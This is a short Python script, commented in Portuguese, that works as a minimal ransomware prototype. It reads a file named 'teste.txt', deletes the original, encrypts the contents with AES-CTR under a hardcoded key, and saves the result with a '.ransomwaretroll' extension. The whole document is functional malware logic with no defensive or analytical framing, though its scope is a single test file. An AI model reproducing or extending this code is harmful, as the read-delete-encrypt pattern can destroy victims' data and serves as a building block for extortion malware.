#bibliotecas necessarias
import os
import pyaes

#abrir o arquivo ao ser criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#remover o arquivo original

os.remove(file_name)

# definir a chave de encripitação

key = b"testeramsomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar o arquivo

crypto_data = aes.encrypt(file_data)

#salvar o arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()